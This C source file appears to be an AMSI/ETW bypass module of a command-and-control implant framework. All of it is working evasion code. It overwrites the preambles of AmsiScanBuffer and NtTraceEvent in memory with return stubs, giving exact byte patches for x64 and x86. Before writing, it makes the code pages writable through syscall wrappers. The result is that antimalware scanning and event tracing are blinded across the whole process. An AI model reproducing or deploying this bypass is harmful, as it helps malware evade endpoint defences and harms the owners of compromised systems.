/*!
 * AmsiEtwBypass.c — persistent process-wide AMSI/ETW bypass for Archon.
 *
 * Unlike the per-thread hardware-breakpoint approach (HwBpEngine), this
 * module patches the function preambles of AmsiScanBuffer and NtTraceEvent
 * directly in memory.  Because the modification targets the underlying code
 * pages — not thread debug registers — the patch is automatically visible to
 * every existing and future thread in the process without any per-thread
 * setup.
 *
 * Patch stubs:
 *   AmsiScanBuffer (x64): mov eax, 0x80070057 (E_INVALIDARG); ret
 *   AmsiScanBuffer (x86): mov eax, 0x80070057; ret 0x18  (6 stdcall args)
 *   NtTraceEvent   (x64): xor eax, eax; ret
 *   NtTraceEvent   (x86): xor eax, eax; ret 0x10        (4 stdcall args)
 *
 * Both stubs fit within the first instruction of the respective functions'
 * preambles; no trampolining or relocation fixup is required.
 */

#include <Demon.h>
#include <core/AmsiEtwBypass.h>
#include <core/SysNative.h>
#include <core/MiniStd.h>
#include <core/Runtime.h>

/* -------------------------------------------------------------------------
 * Patch byte sequences
 * ---------------------------------------------------------------------- */

#if defined( __x86_64__ ) || defined( _M_X64 )

/* mov eax, 0x80070057 (E_INVALIDARG); ret — 6 bytes */
static const UCHAR AmsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

/* xor eax, eax; ret — 3 bytes */
static const UCHAR EtwPatch[]  = { 0x33, 0xC0, 0xC3 };

#else /* x86 */

/* mov eax, 0x80070057; ret 0x18 (stdcall, 6 args * 4 bytes) — 8 bytes */
static const UCHAR AmsiPatch[] = {
    0xB8, 0x57, 0x00, 0x07, 0x80,  /* mov eax, 0x80070057 */
    0xC2, 0x18, 0x00                /* ret 0x18             */
};

/* xor eax, eax; ret 0x10 (stdcall, 4 args * 4 bytes) — 5 bytes */
static const UCHAR EtwPatch[]  = {
    0x33, 0xC0,             /* xor eax, eax */
    0xC2, 0x10, 0x00        /* ret 0x10     */
};

#endif /* x86_64 */

/* -------------------------------------------------------------------------
 * Internal helper: flip a page to PAGE_EXECUTE_READWRITE, write PatchLen
 * bytes from PatchBytes over FuncAddr, then restore the old protection.
 * ---------------------------------------------------------------------- */
static NTSTATUS PatchFunction(
    IN PVOID  FuncAddr,
    IN PVOID  PatchBytes,
    IN SIZE_T PatchLen
) {
    PVOID    Base       = FuncAddr;
    SIZE_T   RegionSize = PatchLen;
    ULONG    OldProt    = 0;
    ULONG    Dummy      = 0;
    NTSTATUS Status     = STATUS_SUCCESS;

    Status = SysNtProtectVirtualMemory(
        NtCurrentProcess(),
        (PVOID)&Base,
        &RegionSize,
        PAGE_EXECUTE_READWRITE,
        &OldProt
    );
    if ( ! NT_SUCCESS( Status ) ) {
        PRINTF( "[BYPASS] NtProtectVirtualMemory(RW) failed: %08x\n", Status )
        return Status;
    }

    MemCopy( FuncAddr, PatchBytes, PatchLen );

    /* Restore original protection; failure here is non-fatal — the patch
     * is already in place and the process will continue correctly. */
    SysNtProtectVirtualMemory(
        NtCurrentProcess(),
        (PVOID)&Base,
        &RegionSize,
        OldProt,
        &Dummy
    );

    return STATUS_SUCCESS;
}

/* -------------------------------------------------------------------------
 * Public API
 * ---------------------------------------------------------------------- */

/*!
 * AmsiEtwBypassPatch — write in-memory stubs to AmsiScanBuffer and
 * NtTraceEvent so that every thread in the process is covered from the
 * moment the patch is applied.
 *
 * Idempotent: if both targets have already been patched the function
 * returns STATUS_SUCCESS immediately.
 */
NTSTATUS AmsiEtwBypassPatch( VOID )
{
    NTSTATUS Status = STATUS_SUCCESS;

    /* Skip if already applied. */
    if ( Instance->Config.Implant.AmsiPatched && Instance->Config.Implant.EtwPatched ) {
        PUTS( "[BYPASS] AMSI/ETW already patched — skipping" )
        return STATUS_SUCCESS;
    }

    /* ------------------------------------------------------------------ */
    /* 1. ETW — patch NtTraceEvent (ntdll, always loaded)                 */
    /* ------------------------------------------------------------------ */
    if ( ! Instance->Config.Implant.EtwPatched ) {
        if ( ! Instance->Win32.NtTraceEvent ) {
            PUTS( "[BYPASS] NtTraceEvent address unavailable" )
            return STATUS_UNSUCCESSFUL;
        }

        Status = PatchFunction(
            Instance->Win32.NtTraceEvent,
            (PVOID)EtwPatch,
            sizeof( EtwPatch )
        );
        if ( ! NT_SUCCESS( Status ) ) {
            PRINTF( "[BYPASS] Failed to patch NtTraceEvent: %08x\n", Status )
            return Status;
        }

        Instance->Config.Implant.EtwPatched = TRUE;
        PUTS( "[BYPASS] NtTraceEvent patched — ETW disabled process-wide" )
    }

    /* ------------------------------------------------------------------ */
    /* 2. AMSI — load amsi.dll if needed, then patch AmsiScanBuffer       */
    /* ------------------------------------------------------------------ */
    if ( ! Instance->Config.Implant.AmsiPatched ) {
        if ( ! Instance->Win32.AmsiScanBuffer ) {
            /* amsi.dll is delay-loaded; try to load it now. */
            if ( ! RtAmsi() ) {
                /* amsi.dll may genuinely be absent (e.g. Server Core).
                 * Treat this as a soft failure — ETW is already patched. */
                PUTS( "[BYPASS] amsi.dll not available — AMSI patch skipped" )
                return STATUS_SUCCESS;
            }
        }

        Status = PatchFunction(
            Instance->Win32.AmsiScanBuffer,
            (PVOID)AmsiPatch,
            sizeof( AmsiPatch )
        );
        if ( ! NT_SUCCESS( Status ) ) {
            PRINTF( "[BYPASS] Failed to patch AmsiScanBuffer: %08x\n", Status )
            return Status;
        }

        Instance->Config.Implant.AmsiPatched = TRUE;
        PUTS( "[BYPASS] AmsiScanBuffer patched — AMSI disabled process-wide" )
    }

    return STATUS_SUCCESS;
}
